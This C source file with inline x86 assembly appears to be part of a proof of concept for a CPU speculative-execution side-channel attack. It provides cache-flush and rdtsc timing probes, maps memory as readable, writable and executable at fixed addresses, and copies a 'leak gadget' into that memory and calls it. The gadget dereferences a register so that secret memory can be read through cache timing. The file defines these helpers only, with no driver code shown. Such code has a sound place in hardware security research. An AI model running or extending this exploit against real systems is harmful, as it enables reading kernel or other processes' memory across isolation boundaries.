#define _GNU_SOURCE 
#include <sched.h>
#include <sys/mman.h>
#include <linux/mman.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <time.h>

#define THRESHOLD 0x90

// mov r13,[r13]
// ret
#define RD_GADGET "M\x8bm\x00"

void flush(uint8_t *adrs)
{
    asm volatile(
        "clflush [%0]                   \n"
        "mfence             \n"
        "lfence             \n"
        :
        : "c"(adrs)
        : "rax");
}

unsigned probe(uint8_t *adrs)
{
    volatile unsigned long time;
    asm __volatile__(
        "    mfence             \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    lfence             \n"
        "    mov esi, eax       \n"
        "    mov eax,[%1]       \n"
        "    lfence             \n"
        "    rdtsc              \n"
        "    sub eax, esi       \n"
        "    clflush [%1]       \n"
        "    mfence             \n"
        "    lfence             \n"
        : "=a"(time)
        : "c"(adrs)
        : "%esi", "%edx");
    return time;
}

uint8_t *requestMem(uint8_t *requestedAddr, unsigned size)
{
    uint8_t *result;
    result = (uint8_t *)mmap(requestedAddr, size, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    if (result != requestedAddr && requestedAddr != NULL)
    {
        printf("mmap failed for %p : returned %p \n", requestedAddr, result);
        exit(1);
    }
    return result;
}

uint8_t requestMemFree(uint8_t *requestedAddr, unsigned size)
{
    uint8_t result= munmap(requestedAddr, size);
    if (result != 0 && requestedAddr != NULL)
    {
        printf("munmap failed for %p \n", requestedAddr);
        exit(1);
    }
    return result;
}

uint8_t *requestMemremap(uint8_t *requestedAddr, uint8_t *oldAddress, unsigned size)
{
    uint8_t *result = (uint8_t *)mremap(oldAddress, size, size, MREMAP_MAYMOVE | MREMAP_FIXED, requestedAddr);
    if (result != requestedAddr)
    {
        printf("mmap failed for %p : returned %p \n", requestedAddr, result);
        exit(1);
    }
    return result;
}

void callGadget(uint8_t *code, uint8_t *rdiPtr, uint8_t *probeArray)
{
    asm __volatile__(
        "mov r13, %2    \n"
        "mov rdi, %1    \n"
        "call %0       \n"
        :
        : "r"(code), "m"(rdiPtr), "m"(probeArray)
        : "rdi");
}

void copyLeakGadget(uint8_t *dst)
{
    memcpy(dst, RD_GADGET, sizeof(RD_GADGET));
}
